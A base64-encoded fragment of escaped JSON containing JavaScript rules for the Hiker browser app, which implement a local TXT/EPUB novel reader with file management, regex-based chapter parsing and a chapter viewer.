AgICAgICAgY29uc3QgRmlsZSA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL0ZpbGUuanNcXFwiKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgRmlsZS5jb3B5RmlsZShwYXRoLCB0b3BhdGgpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZmlsZUV4aXN0KFxcXCJmaWxlOi8vXFxcIiArIHRvcGF0aENhY2hlKSkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRmlsZS5kZWxldGVGaWxlcyh0b3BhdGhDYWNoZSk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYmFjaygpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5a+85YWl5oiQ5YqfXFxcIjtcXG4gICAgICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgICAgICB9KSxcXG4gICAgICAgICAgICAgICAgICAgIGZpbGVUeXBlOiBcXFwiLnR4dHwuZXB1YlxcXCIsXFxuICAgICAgICAgICAgICAgICAgICBvbkNsaWNrVHlwZTogXFxcImNvbmZpcm1cXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgc3RvcmU6IFxcXCJzZWxlY3RQYXRoQ2FjaGUxXFxcIixcXG4gICAgICAgICAgICAgICAgICAgIG1lbW9yeVBhdGg6IHRydWVcXG4gICAgICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSksXFxuICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgIGxpbmVWaXNpYmxlOiBmYWxzZVxcbiAgICAgICAgfVxcbiAgICB9KTtcXG4gICAgbGV0IG9wdGlvbnMgPSBbXFxcIumYheivu1xcXCIsIFxcXCLliIbkuqtcXFwiLCBcXFwi5Yig6ZmkXFxcIiwgXFxcIuaJk+W8gOaWueW8j1xcXCJdO1xcblxcbiAgICBsZXQgcGF0dGVybiA9IGdldE15VmFyKFxcXCI6dHh0UGF0dGVyblxcXCIsIG9wdGlvbnNbMF0pO1xcbiAgICBsZXQgaWQgPSBEYXRlLm5vdygpICsgXFxcIjrmqKHlvI9cXFwiO1xcbiAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICB0aXRsZTogcGF0dGVybixcXG4gICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF8zXFxcIixcXG4gICAgICAgIHVybDogJChvcHRpb25zLCAxLCBcXFwi5pON5L2c5qih5byPXFxcIikuc2VsZWN0KChpZCkgPT4ge1xcbiAgICAgICAgICAgIHB1dE15VmFyKFxcXCI6dHh0UGF0dGVyblxcXCIsIGlucHV0KTtcXG4gICAgICAgICAgICB1cGRhdGVJdGVtKGlkLCB7XFxuICAgICAgICAgICAgICAgIHRpdGxlOiBpbnB1dFxcbiAgICAgICAgICAgIH0pO1xcbiAgICAgICAgfSwgaWQpLFxcbiAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICBpZDogaWRcXG4gICAgICAgIH1cXG4gICAgfSk7XFxuICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiBcXFwi5paH5Lu2566h55CGXFxcIixcXG4gICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF8zXFxcIixcXG4gICAgICAgIHVybDogXFxcImhpa2VyOi8vcGFnZS9GaWxlTWFuYWdlbWVudC52aWV3I25vUmVmcmVzaCMjbm9SZWNvcmRIaXN0b3J5IyNub0hpc3RvcnkjP3R5cGU9ZXh0ZXJuYWxJbXBvcnRQYXRoXFxcIlxcbiAgICB9KTtcXG4gICAgbGF5b3V0LnB1c2goe1xcbiAgICAgICAgY29sX3R5cGU6IFxcXCJsaW5lX2JsYW5rXFxcIlxcbiAgICB9KTtcXG5cXG4gICAgZnVuY3Rpb24gb3BlcmF0aW9uKHBhdGgsIG5hbWUsIHR5cGUpIHtcXG4gICAgICAgIGxldCBwYXR0ZXJuID0gZ2V0TXlWYXIoXFxcIjp0eHRQYXR0ZXJuXFxcIiwgXFxcIumYheivu1xcXCIpO1xcbiAgICAgICAgc3dpdGNoIChwYXR0ZXJuKSB7XFxuICAgICAgICAgICAgY2FzZSBcXFwi5YiG5LqrXFxcIjpcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJzaGFyZTovL1xcXCIgKyBwYXRoO1xcbiAgICAgICAgICAgICAgICBicmVhaztcXG4gICAgICAgICAgICBjYXNlIFxcXCLliKDpmaRcXFwiOlxcbiAgICAgICAgICAgICAgICByZXR1cm4gJChcXFwi56Gu6K6k5Yig6ZmkW1xcXCIgKyBuYW1lICsgXFxcIl1cXFwiKS5jb25maXJtKChwYXRoKSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICBjb25zdCBGaWxlID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvRmlsZS5qc1xcXCIpO1xcbiAgICAgICAgICAgICAgICAgICAgaWYgKEZpbGUuZGVsZXRlRmlsZXMocGF0aCkpIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoZmlsZUV4aXN0KFxcXCJmaWxlOi8vXFxcIiArIHBhdGggKyBcXFwiLmpzb25cXFwiKSkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBGaWxlLmRlbGV0ZUZpbGVzKHBhdGggKyBcXFwiLmpzb25cXFwiKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgICAgICAgICAgLy9yZWZyZXNoUGFnZSgpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGRlbGV0ZUl0ZW0ocGF0aClcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5Yig6Zmk5oiQ5YqfXFxcIjtcXG4gICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+WIoOmZpOWksei0pVxcXCI7XFxuICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIH0sIHBhdGgpO1xcbiAgICAgICAgICAgICAgICBicmVhaztcXG4gICAgICAgICAgICBjYXNlIFxcXCLpmIXor7tcXFwiOlxcbiAgICAgICAgICAgICAgICByZXR1cm4gKHR5cGU9PT1cXFwiLnR4dFxcXCI/XFxcImhpa2VyOi8vcGFnZS90eHRQYXJzZXIudmlld1xcXCI6XFxcImhpa2VyOi8vcGFnZS9lcHViUGFyc2VyLnZpZXcjYXV0b0NhY2hlI1xcXCIpK1xcXCI/cnVsZT1cXFwiICsgTVlfUlVMRS50aXRsZTtcXG4gICAgICAgICAgICAgICAgYnJlYWs7XFxuICAgICAgICAgICAgY2FzZSBcXFwi5omT5byA5pa55byPXFxcIjpcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJvcGVuRmlsZTovL2ZpbGU6Ly9cXFwiICsgcGF0aDtcXG4gICAgICAgICAgICAgICAgYnJlYWs7XFxuICAgICAgICB9XFxuICAgIH1cXG5cXG4gICAgZm9yIChsZXQgbm92ZWwgb2YgZmlsZXMpIHtcXG4gICAgICAgIGxldCB0eXBlID0gbm92ZWwubmFtZS5zdWJzdHJpbmcobm92ZWwubmFtZS5sYXN0SW5kZXhPZihcXFwiLlxcXCIpKTtcXG4gICAgICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgICAgICB0aXRsZTogbm92ZWwubmFtZSxcXG4gICAgICAgICAgICB1cmw6ICQoXFxcIiNub0xvYWRpbmcjXFxcIikubGF6eVJ1bGUob3BlcmF0aW9uLCBub3ZlbC5wYXRoLCBub3ZlbC5uYW1lLCB0eXBlKSxcXG4gICAgICAgICAgICBkZXNjOiBcXFwi5aSn5bCP77yaXFxcIiArIEZpbGUuZ2V0RmlsZVNpemUobm92ZWwucGF0aCkgKyBcXFwiXFxcXG7kv67mlLnml7bpl7TvvJpcXFwiICsgJC5kYXRlRm9ybWF0KG5vdmVsLmxhc3RNb2RpZmllZCwgXFxcInl5eXktTU0tZGQgSEg6bW06c3NcXFwiKSxcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcInRleHRfMVxcXCIsXFxuICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgcGF0aDogbm92ZWwucGF0aCxcXG4gICAgICAgICAgICAgICAgaXNDYWNoZTogdHJ1ZSxcXG4gICAgICAgICAgICAgICAgdGl0bGU6IG5vdmVsLm5hbWUsXFxuICAgICAgICAgICAgICAgIGlkOiBub3ZlbC5wYXRoLFxcbiAgICAgICAgICAgICAgICBsb25nQ2xpY2s6IFt7XFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogXFxcIuWIhuS6q1xcXCIsXFxuICAgICAgICAgICAgICAgICAgICBqczogSlNPTi5zdHJpbmdpZnkoXFxcInNoYXJlOi8vXFxcIiArIG5vdmVsLnBhdGgpXFxuICAgICAgICAgICAgICAgIH0sIHtcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFwi6ZiF6K+7XFxcIixcXG4gICAgICAgICAgICAgICAgICAgIGpzOiBKU09OLnN0cmluZ2lmeSgodHlwZT09PVxcXCIudHh0XFxcIj9cXFwiaGlrZXI6Ly9wYWdlL3R4dFBhcnNlci52aWV3XFxcIjpcXFwiaGlrZXI6Ly9wYWdlL2VwdWJQYXJzZXIudmlldyNhdXRvQ2FjaGUjXFxcIikrXFxcIj9ydWxlPVxcXCIgKyBNWV9SVUxFLnRpdGxlKVxcbiAgICAgICAgICAgICAgICB9LCB7XFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogXFxcIuaJk+W8gOaWueW8j1xcXCIsXFxuICAgICAgICAgICAgICAgICAgICBqczogSlNPTi5zdHJpbmdpZnkoXFxcIm9wZW5GaWxlOi8vZmlsZTovL1xcXCIgKyBub3ZlbC5wYXRoKVxcbiAgICAgICAgICAgICAgICB9LCB7XFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogXFxcIuWIoOmZpFxcXCIsXFxuICAgICAgICAgICAgICAgICAgICBqczogJC50b1N0cmluZygocGF0aCkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAkLnJlcXVpcmUoXFxcImxvbmdQcmVzcy5qc1xcXCIpLmRlbGV0ZUZpbGVGb3JUeHQocGF0aClcXG4gICAgICAgICAgICAgICAgICAgIH0sIG5vdmVsLnBhdGgpXFxuICAgICAgICAgICAgICAgIH1dXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSk7XFxuICAgIH1cXG4gICAgaWYgKGZpbGVzLmxlbmd0aCA9PT0gMCkge1xcbiAgICAgICAgbGF5b3V0LnB1c2goe1xcbiAgICAgICAgICAgIHRpdGxlOiBcXFwi6K6+572uXFxcIixcXG4gICAgICAgICAgICB1cmw6IFxcXCJoaWtlcjovL3BhZ2UvU2V0dGluZy52aWV3I25vUmVmcmVzaCMjbm9SZWNvcmRIaXN0b3J5IyNub0hpc3RvcnkjXFxcIixcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcInRleHRfMlxcXCIsXFxuICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgdmVyc2lvbjogTVlfUlVMRS52ZXJzaW9uXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSk7XFxuXFxuICAgICAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6IFxcXCLigJzigJzluK7liqnigJ3igJ1cXFwiLFxcbiAgICAgICAgICAgIHVybDogXFxcImhpa2VyOi8vcGFnZS9oZWxwLnZpZXcjbm9SZWZyZXNoIyNub1JlY29yZEhpc3RvcnkjI25vSGlzdG9yeSM/a2V5d29yZD10eHRcXFwiLFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF8yXFxcIlxcbiAgICAgICAgfSk7XFxuICAgICAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6ICc8aDEgc3R5bGU9XFxcInRleHQtYWxpZ246IGNlbnRlcjtcXFwiPuWVpemDveayoeacieiAtjwvaDE+JyxcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcInJpY2hfdGV4dFxcXCJcXG4gICAgICAgIH0pO1xcbiAgICB9XFxuICAgIHNldFJlc3VsdChsYXlvdXQpO1xcbn1cXG5cXG5pZiAoJC5pbXBvcnRQYXJhbSA9PT0gdW5kZWZpbmVkKSB7XFxuICAgICQuZXhwb3J0cyA9IHR4dFZpZXc7XFxufSBlbHNlIGlmICgkLmltcG9ydFBhcmFtID09PSBudWxsKSB7XFxuICAgIHNldFJlc3VsdCh0eHRWaWV3KFtdKSk7XFxufVwifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwiI3YuVFhU6Kej5p6Q5ZmoXCIsXCJwYXRoXCI6XCJ0eHRQYXJzZXIudmlld1wiLFwicnVsZVwiOlwianM6XFxuKGZ1bmN0aW9uKCkge1xcbiAgICBjb25zdCBDb25maWcgPSAkLnJlcXVpcmUoXFxcIkNvbmZpZy5qc1xcXCIpO1xcbiAgICBsZXQgcmVncyA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL3JlZ3VsYXJDaGFwdGVyLmZcXFwiKTtcXG4gICAgbGV0IHBhdGggPSBkZWNvZGVVUklDb21wb25lbnQoZ2V0UGFyYW0oXFxcInBhdGhcXFwiKSB8fCBcXFwiXFxcIikgfHwgTVlfUEFSQU1TLnBhdGg7XFxuICAgIGxldCBjaGFyc3QgPSBkZWNvZGVVUklDb21wb25lbnQoZ2V0UGFyYW0oXFxcImNoYXJzdFxcXCIpIHx8IFxcXCJcXFwiKSB8fCBNWV9QQVJBTVMuY2hhcnN0IHx8IFxcXCJVVEYtOFxcXCI7XFxuICAgIGxldCBpc0NhY2hlID0gZGVjb2RlVVJJQ29tcG9uZW50KGdldFBhcmFtKFxcXCJpc0NhY2hlXFxcIikgfHwgXFxcIlxcXCIpIHx8IE1ZX1BBUkFNUy5pc0NhY2hlO1xcbiAgICBpZiAoIXBhdGguc3RhcnRzV2l0aChcXFwiZmlsZTovL1xcXCIpKSB7XFxuICAgICAgICBwYXRoID0gXFxcImZpbGU6Ly9cXFwiICsgcGF0aDtcXG4gICAgfVxcbiAgICBpZihNWV9QQVJBTVMudGl0bGUpe1xcbiAgICAgICAgc2V0UGFnZVRpdGxlKE1ZX1BBUkFNUy50aXRsZSk7XFxuICAgIH1lbHNle1xcbiAgICAgICAgc2V0UGFnZVRpdGxlKCQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL0ZpbGUuanNcXFwiKS5nZXROYW1lKHBhdGgpKTtcXG4gICAgfVxcbiAgICBsZXQgbGF5b3V0ID0gW107XFxuICAgIGxldCBjaGFwdGVyTmFtZXMgPSBbXTtcXG4gICAgbGV0IGludGVydmFscyA9IFtdO1xcbiAgICBsZXQgaGFzUHJlZmFjZSA9IGZhbHNlO1xcbiAgICBsZXQgY2FjaGVQYXRoID0gcGF0aC5yZXBsYWNlKENvbmZpZy5leHRlcm5hbEltcG9ydFBhdGgsIENvbmZpZy5jb250ZW50c0NhY2hlKTtcXG4gICAgaWYgKGlzQ2FjaGUmJmZpbGVFeGlzdChjYWNoZVBhdGgpKSB7XFxuICAgICAgICB0cnkge1xcblxcbiAgICAgICAgICAgIGxldCBjID0gSlNPTi5wYXJzZShyZXF1ZXN0KGNhY2hlUGF0aCkpO1xcbiAgICAgICAgICAgIGNoYXB0ZXJOYW1lcyA9IGMuY2hhcHRlck5hbWVzO1xcbiAgICAgICAgICAgIGludGVydmFscyA9IGMuaW50ZXJ2YWxzO1xcbiAgICAgICAgICAgIGhhc1ByZWZhY2UgPSBjLmhhc1ByZWZhY2U7XFxuICAgICAgICAgICAgbGF5b3V0LnB1c2goe1xcbiAgICAgICAgICAgICAgICB0aXRsZTogXFxcIumHjeaWsOino+aekOebruW9lVxcXCIsXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF9jZW50ZXJfMVxcXCIsXFxuICAgICAgICAgICAgICAgIHVybDogJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZSgocGF0aCkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgZGVsZXRlRmlsZShwYXRoKTtcXG4gICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiO1xcbiAgICAgICAgICAgICAgICB9LCBwYXRoK1xcXCIuanNvblxcXCIpLFxcbiAgICAgICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICAgICAgbGluZVZpc2libGU6ZmFsc2VcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6XFxcImxpbmVfYmxhbmtcXFwiXFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICB9IGNhdGNoIChlKSB7XFxuICAgICAgICAgICAgbG9nKGUudG9TdHJpbmcoKSk7XFxuICAgICAgICAgICAgc2V0UmVzdWx0KFt7XFxuICAgICAgICAgICAgICAgIHRpdGxlOiBcXFwi4oCc4oCc4oCd4oCdPHN0cm9uZz7nm67lvZXop6PmnpDlpLHotKUo6YeN5paw6Kej5p6QKTwvc3Ryb25nPlxcXCIuYmlnKCksXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF9jZW50ZXJfMVxcXCIsXFxuICAgICAgICAgICAgICAgIHVybDogJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZSgocGF0aCkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgZGVsZXRlRmlsZShwYXRoKTtcXG4gICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiO1xcbiAgICAgICAgICAgICAgICB9LCBwYXRoK1xcXCIuanNvblxcXCIpLFxcbiAgICAgICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICAgICAgbGluZVZpc2libGU6IGZhbHNlXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9XSk7XFxuICAgICAgICAgICAgcmV0dXJuO1xcbiAgICAgICAgfVxcblxcbiAgICB9IGVsc2Uge1xcbiAgICAgICAgc2hvd0xvYWRpbmcoXFxcIuato+WcqOino+aekOebruW9lVxcXCIpO1xcbiAgICAgICAgbGV0IHR4dCA9IHJlcXVlc3QocGF0aCwge1xcbiAgICAgICAgICAgIGhlYWRlcnM6IHtcXG4gICAgICAgICAgICAgICAgLy9cXFwiY29udGVudC10eXBlXFxcIjogXFxcInRleHQvcGxhaW47IGNoYXJzdD1cXFwiICsgY2hhcnN0XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSk7XFxuICAgICAgICBsZXQgcGF0dGVybiA9IHJlZ3MuZ2V0VG9jUnVsZSh0eHQpO1xcbiAgICAgICAgaWYgKCFwYXR0ZXJuKSB7XFxuICAgICAgICAgICAgaGlkZUxvYWRpbmcoKTtcXG4gICAgICAgICAgICBzZXRSZXN1bHQoW3tcXG4gICAgICAgICAgICAgICAgdGl0bGU6IFxcXCLigJzigJzigJ3igJ08c3Ryb25nPuebruW9leino+aekOWksei0pTwvc3Ryb25nPlxcXCIuYmlnKCksXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF9jZW50ZXJfMVxcXCIsXFxuICAgICAgICAgICAgICAgIHVybDogJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZSgoKSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICBiYWNrKGZhbHNlKTtcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCI7XFxuICAgICAgICAgICAgICAgIH0pLFxcbiAgICAgICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICAgICAgbGluZVZpc2libGU6IGZhbHNlXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9XSk7XFxuICAgICAgICAgICAgcmV0dXJuO1xcbiAgICAgICAgfVxcbiAgICAgICAgbGV0IG1hdGNoZXIgPSBwYXR0ZXJuLm1hdGNoZXIodHh0KTtcXG4gICAgICAgIGxldCBwb2ludGVyID0gMDtcXG4gICAgICAgIHdoaWxlIChtYXRjaGVyLmZpbmQoKSkge1xcbiAgICAgICAgICAgIGxldCBzdGFydCA9IG1hdGNoZXIuc3RhcnQoKTtcXG4gICAgICAgICAgICBsZXQgZW5kID0gbWF0Y2hlci5lbmQoKTtcXG4gICAgICAgICAgICBsZXQgdCA9IG1hdGNoZXIuZ3JvdXAoKTtcXG4gICAgICAgICAgICBpZiAocG9pbnRlciA9PT0gMCAmJiBzdGFydCA+IDMwKSB7XFxuICAgICAgICAgICAgICAgIGhhc1ByZWZhY2UgPSB0cnVlO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICBjaGFwdGVyTmFtZXMucHVzaCh0KTtcXG4gICAgICAgICAgICBpbnRlcnZhbHMucHVzaChbcG9pbnRlciwgc3RhcnRdKTtcXG4gICAgICAgICAgICBwb2ludGVyID0gZW5kO1xcbiAgICAgICAgfVxcbiAgICAgICAgaW50ZXJ2YWxzLnB1c2goW3BvaW50ZXIsIHR4dC5sZW5ndGhdKTtcXG4gICAgICAgIGlmIChpc0NhY2hlKSB7XFxuICAgICAgICAgICAgd3JpdGVGaWxlKGNhY2hlUGF0aCwgSlNPTi5zdHJpbmdpZnkoe1xcbiAgICAgICAgICAgICAgICBjaGFwdGVyTmFtZXM6IGNoYXB0ZXJOYW1lcyxcXG4gICAgICAgICAgICAgICAgaW50ZXJ2YWxzOiBpbnRlcnZhbHMsXFxuICAgICAgICAgICAgICAgIGhhc1ByZWZhY2U6IGhhc1ByZWZhY2VcXG4gICAgICAgICAgICB9KSk7XFxuICAgICAgICB9XFxuICAgICAgICBoaWRlTG9hZGluZygpO1xcbiAgICB9XFxuXFxuXFxuICAgIGlmIChoYXNQcmVmYWNlKSB7XFxuICAgICAgICBsZXQgaW50ZXJ2YWwgPSBpbnRlcnZhbHNbMF07XFxuICAgICAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6IFxcXCLluo/oqIBcXFwiLFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF8xXFxcIixcXG4gICAgICAgICAgICB1cmw6IFxcXCJoaWtlcjovL3BhZ2UvVFhUVmlld2VyLnZpZXcjYXV0b1BhZ2UjI3JlYWRUaGVtZSNcXFwiLFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgIGNoYXB0ZXJOYW1lOiBcXFwi5bqP6KiAXFxcIixcXG4gICAgICAgICAgICAgICAgc3RhcnQ6IGludGVydmFsWzBdLFxcbiAgICAgICAgICAgICAgICBlbmQ6IGludGVydmFsWzFdLFxcbiAgICAgICAgICAgICAgICBwYXRoOiBwYXRoLFxcbiAgICAgICAgICAgICAgICBjaGFyc3Q6IGNoYXJzdFxcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH0pO1xcbiAgICB9XFxuICAgIGZvciAobGV0IGkgPSAwOyBpIDwgY2hhcHRlck5hbWVzLmxlbmd0aDsgaSsrKSB7XFxuICAgICAgICBsZXQgbmFtZSA9IGNoYXB0ZXJOYW1lc1tpXTtcXG4gICAgICAgIGxldCBpbnRlcnZhbCA9IGludGVydmFsc1tpICsgMV07XFxuICAgICAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6IG5hbWUsXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzFcXFwiLFxcbiAgICAgICAgICAgIHVybDogXFxcImhpa2VyOi8vcGFnZS9UWFRWaWV3ZXIudmlldyNhdXRvUGFnZSMjcmVhZFRoZW1lI1xcXCIsXFxuICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgc3RhcnQ6IGludGVydmFsWzBdLFxcbiAgICAgICAgICAgICAgICBlbmQ6IGludGVydmFsWzFdLFxcbiAgICAgICAgICAgICAgICBjaGFwdGVyTmFtZTogbmFtZSxcXG4gICAgICAgICAgICAgICAgcGF0aDogcGF0aCxcXG4gICAgICAgICAgICAgICAgY2hhcnN0OiBjaGFyc3RcXG4gICAgICAgICAgICB9XFxuICAgICAgICB9KTtcXG4gICAgfVxcbiAgICBzZXRSZXN1bHQobGF5b3V0KTtcXG59KSgpXCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCIjdi5UWFTmn6XnnIvlmahcIixcInBhdGhcIjpcIlRYVFZpZXdlci52aWV3XCIsXCJydWxlXCI6XCJqczpcXG5sZXQgcGF0aCA9IE1ZX1BBUkFNUy5wYXRoO1xcbmxldCBjaGFyc3QgPSBNWV9QQVJBTVMuY2hhcnN0O1xcbmxldCB0eHQgPSByZXF1ZXN0KHBhdGgsIHtcXG4gICAgaGVhZGVyczoge1xcbiAgICAgICAvL1xcXCJjb250ZW50LXR5cGVcXFwiOiBcXFwidGV4dC9wbGFpbjsgY2hhcnN0PVxcXCIgKyBjaGFyc3RcXG4gICAgfVxcbn0pO1xcblxcbmxldCB0YXJnZXRUZXh0cyA9IHR4dC5zdWJzdHJpbmcoTVlfUEFSQU1TLnN0YXJ0LCBNWV9QQVJBTVMuZW5kKTtcXG5cXG5sZXQgY29udGVudCA9IHRhcmdldFRleHRzLnNwbGl0KC8oXFxcXG58XFxcXHIpKy8pLmZpbHRlcihpdCA9PiBpdC5sZW5ndGggPiAxKS5qb2luKFxcXCI8YnI+XFxcIik7XFxubGV0IGxheW91dCA9IFtdO1xcbmxheW91dC5wdXNoKHtcXG4gICAgY29sX3R5cGU6IFxcXCJyaWNoX3RleHRcXFwiLFxcbiAgICB0aXRsZTogKFxcXCI8c3Ryb25nPlxcXCIgKyBNWV9QQVJBTVMuY2hhcHRlck5hbWUgKyBcXFwiPC9zdHJvbmc+XFxcIikuYmlnKCksXFxufSk7XFxuXFxubGF5b3V0LnB1c2goe1xcbiAgICB0aXRsZTogY29udGVudCxcXG4gICAgY29sX3R5cGU6ICdyaWNoX3RleHQnLFxcbiAgICBleHRyYToge1xcbiAgICAgICAgdGV4dFNpemU6IDE4LFxcbiAgICAgICAgY2xpY2s6IHRydWVcXG4gICAgfVxcbn0pO1xcbnNldFJlc3VsdChsYXlvdXQpO1wifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwiI2ou56ug6IqC5q2j5YiZXCIsXCJwYXRoXCI6XCJyZWd1bGFyQ2hhcHRlci5mXCIsXCJydWxlXCI6XCJqczpcXG5sZXQgcnVsZXMgPSBbe1xcbiAgICAgICAgXFxcImlkXFxcIjogLTEsXFxuICAgICAgICBcXFwiZW5hYmxlXFxcIjogdHJ1ZSxcXG4gICAgICAgIFxcXCJuYW1lXFxcIjogXFxcIuebruW9lSjljrvnqbrnmb0pXFxcIixcXG4gICAgICAgIFxcXCJydWxlXFxcIjogXFxcIig/PD1b44CAXFxcXFxcXFxzXSkoPzrluo/nq6B85qWU5a2QfOato+aWhyg/IeWujHznu5MpfOe7iOeroHzlkI7orrB85bC+5aOwfOeVquWklnznrKw/XFxcXFxcXFxzezAsNH1bXFxcXFxcXFxk44CH6Zu25LiA5LqM5Lik5LiJ5Zub5LqU5YWt5LiD5YWr5Lmd5Y2B55m+5Y2D5LiH5aO56LSw5Y+B6IKG5LyN6ZmG5p+S5o2M546W5ou+5L2w5LufXSs/XFxcXFxcXFxzezAsNH0oPzrnq6B86IqCKD8h6K++KXzljbd86ZuGKD8hW+WQiOWSjF0pKSkuezAsMzB9JFxcXCIsXFxuICAgICAgICBcXFwiZXhhbXBsZVxcXCI6IFxcXCLnrKzkuIDnq6Ag5YGH6KOF56ys5LiA56ug5YmN6Z2i5pyJ56m655m95L2G5oiR5LiN6KaBXFxcIixcXG4gICAgICAgIFxcXCJzZXJpYWxOdW1iZXJcXFwiOiAwXFxuICAgIH0sXFxuICAgIHtcXG4gICAgICAgIFxcXCJpZFxcXCI6IC0yLFxcbiAgICAgICAgXFxcImVuYWJsZVxcXCI6IHRydWUsXFxuICAgICAgICBcXFwibmFtZVxcXCI6IFxcXCLnm67lvZVcXFwiLFxcbiAgICAgICAgXFxcInJ1bGVcXFwiOiBcXFwiXlsg44CAXFxcXFxcXFx0XXswLDR9KD865bqP56ugfOallOWtkHzmraPmlocoPyHlrox857uTKXznu4jnq6B85ZCO6K6wfOWwvuWjsHznlarlpJZ856ysP1xcXFxcXFxcc3swLDR9W1xcXFxcXFxcZOOAh+mbtuS4gOS6jOS4pOS4ieWbm+S6lOWFreS4g+WFq+S5neWNgeeZvuWNg+S4h+Wjuei0sOWPgeiChuS8jemZhuafkuaNjOeOluaLvuS9sOS7n10rP1xcXFxcXFxcc3swLDR9KD8656ugfOiKgig/Ieivvil85Y23fOmbhig/IVvlkIjlkoxdKXzpg6goPyFb5YiG6LWb5ri4XSl856+HKD8h5bygKSkpLnswLDMwfSRcXFwiLFxcbiAgICAgICAgXFxcImV4YW1wbGVcXFwiOiBcXFwi56ys5LiA56ugIOagh+WHhueahOeypOivreWwseaYr+i/meagt1xcXCIsXFxuICAgICAgICBcXFwic2VyaW